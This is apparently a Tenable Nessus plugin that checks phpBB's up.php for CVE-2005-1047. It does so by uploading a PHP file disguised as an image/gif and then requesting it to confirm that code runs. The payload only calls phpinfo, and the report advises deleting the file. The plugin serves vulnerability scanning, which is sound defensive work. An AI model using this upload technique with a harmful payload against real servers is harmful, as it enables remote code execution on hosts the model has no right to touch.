#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18007);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-1047");
  script_bugtraq_id(13084);
  script_osvdb_id(15481);

  script_name(english:"phpBB up.php Arbitrary File Upload");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary file
uploads." );
 script_set_attribute(attribute:"description", value:
"The installed version of phpBB on the remote host includes a file
upload script intended as a way for users to upload files that they
can then link to in their posts.  The script, however, does not
require authentication, makes only a limited check of upload file
types, and stores uploads in a known location.  As a result, an
attacker can upload arbitrary scripts to the remote host and execute
them with the permissions of the web server user." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Apr/122" );
 script_set_attribute(attribute:"solution", value:
"Uninstall the file upload script from phpBB." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/04/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/04/07");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpbb_group:phpbb");
script_end_attributes();

 
  script_summary(english:"Checks for file upload script vulnerability in phpBB");
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_family(english:"CGI abuses");

  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpBB");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Let's try to upload a PHP script.
  fname = string(SCRIPT_NAME, ".php");

  bound = "bound";
  boundary = string("--", bound);
  postdata = string(
    boundary, "\r\n",
    'Content-Disposition: form-data; name="userfile"; filename="', fname, '"', "\r\n",
    # nb: the script prevents "text/plain" so we'll lie.
    "Content-Type: image/gif\r\n",
    "\r\n",
    "<?php phpinfo() ?>\r\n",

    boundary, "--", "\r\n"
  );
  r = http_send_recv3(method: "POST",  item: dir + "/up.php", port: port,
    content_type: "multipart/form-data; boundary="+bound,
    data: postdata);
  if (isnull(r)) exit(0);
  res = r[2];

  # Try to identify the uploaded file.
  #
  # nb: this should go into "uploads/" but we'll do a search to be sure.
  pat = string("<a href=([^>]+/)", fname, ">", fname, "</a>");
  matches = egrep(pattern:pat, string:res, icase:TRUE);
  foreach match (split(matches)) {
    match = chomp(match);
    upload = eregmatch(pattern:pat, string:match);
    if (upload == NULL) break;
    upload = string(dir, "/", upload[1], fname);
    break;
  }

  if (!isnull(upload)) {
    # Make sure the uploaded script can be run.
    r = http_send_recv3(method:"GET", item:upload, port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # If we could run it, there's a problem.
    if ("PHP Version" >< res) {
      report = string(
        "Nessus has successfully exploited this vulnerability by uploading\n",
        "an image file with PHP code that reveals information about the\n",
        "PHP configuration on the remote host. The file is located under\n",
        "the web server's document directory as:\n",
        "  ", upload, "\n",
        "You are strongly encouraged to delete this file as soon as\n",
        "possible as it can be run by anyone who accesses it remotely.\n"
      );
      security_hole(port:port, extra:report);
      exit(0);
    }
  }
}
